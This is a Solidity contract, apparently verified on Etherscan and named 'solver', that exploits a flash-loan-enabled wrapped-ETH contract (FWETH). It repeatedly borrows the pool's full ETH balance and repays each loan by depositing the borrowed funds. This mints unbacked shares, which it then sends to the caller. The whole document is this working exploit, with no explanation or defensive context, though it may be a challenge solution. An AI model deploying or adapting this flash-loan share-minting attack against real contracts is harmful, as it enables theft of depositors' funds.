/**
 *Submitted for verification at Etherscan.io on 2022-09-05
*/

/**
 *Submitted for verification at Etherscan.io on 2021-12-27
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface FWETH {
    function flashFee(address, uint256 amount) external view returns (uint256);
    function flashLoan(address receiver, address, uint256 amount, bytes calldata data) external returns (bool);
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address user) external returns (uint256);
    function withdraw(uint256 share) external;
    function totalSupply() external view returns (uint256);
}

contract solver {
    
    FWETH private constant fweth = FWETH(0x03dc0d7bbAa1c6A04Bc2021D55B39da89222C6D3);
    address private constant deployer = 0x80c2a271901fc1B01C04A9C340B60ccA8B451C15;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function mintExtra() public payable {
        for(uint256 i = 0; i < 5; i++) {
            fweth.flashLoan(address(this), address(0), address(fweth).balance, "");
        }        
        uint256 shares = fweth.balanceOf(address(this));
        fweth.transfer(msg.sender, shares);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes memory
    ) external returns (bytes32) {
        fweth.deposit{value: amount + fee}();
        return CALLBACK_SUCCESS;
    }

    receive() external payable {}

}